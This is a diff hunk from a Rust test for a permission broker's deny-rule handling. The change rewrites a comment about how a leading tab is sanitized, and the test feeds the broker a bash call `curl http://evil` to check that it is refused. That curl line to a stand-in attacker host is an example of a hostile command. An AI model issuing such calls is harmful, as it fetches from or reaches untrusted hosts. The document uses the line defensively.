@@ -858,9 +858,11 @@ async fn a_laundered_deny_match_refuses_under_prompt_mode_without_degrading_to_a
     );
 
     // The sanitized shape of a leading tab, as the real `render_call` seam
-    // actually produces it (`conway_runtime::tools::runner::
-    // sanitize_rendered`) -- a hand-copy for the identical layering reason
-    // `permission_pattern`'s own tests document.
+    // actually produces it (`conway_runtime::tools::runner::sanitize_rendered`
+    // -> `conway_core::text::sanitize_control_chars`). The fixture hand-writes
+    // the post-sanitization shape (`SANITIZED_CONTROL_PLACEHOLDER` = `\u{FFFD}`);
+    // the render-seam test exercises the genuine sanitizer end to end, so this
+    // shape cannot drift from the real one.
     let outcome = broker
         .decide(&c, &bash_call("c1", "\u{FFFD}curl http://evil"))
         .await;
